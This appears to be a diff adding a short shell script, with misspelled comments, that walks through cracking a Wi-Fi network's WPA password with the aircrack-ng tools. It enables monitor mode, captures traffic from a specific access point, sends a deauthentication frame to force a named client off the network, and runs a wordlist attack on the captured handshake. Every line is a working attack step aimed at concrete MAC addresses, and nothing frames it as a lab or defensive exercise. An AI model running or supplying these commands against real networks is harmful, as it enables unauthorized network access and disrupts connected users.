@@ -1,0 +1,21 @@
+
+
+ifconfig wlan0
+
+airmon-ng check kill
+
+
+#                     6 namber of chaneel modam
+airmon-ng start wlan0 6
+
+
+airodump-ng wlan0
+
+#           6 is chanel modam                
+airodump-ng -c 6 --bssid D4:E6:B7:0E:8A:E5 -w test wlan0
+
+#                   a is modam              c is any divec conect
+aireplay-ng -0 1 -a D4:E6:B7:0E:8A:E5 -c 54:E6:FC:FC:12:8C wlan0
+
+#                             b is modam
+aircrack-ng -w pass.list -b D4:E6:B7:0E:8A:E5 test-01.cap
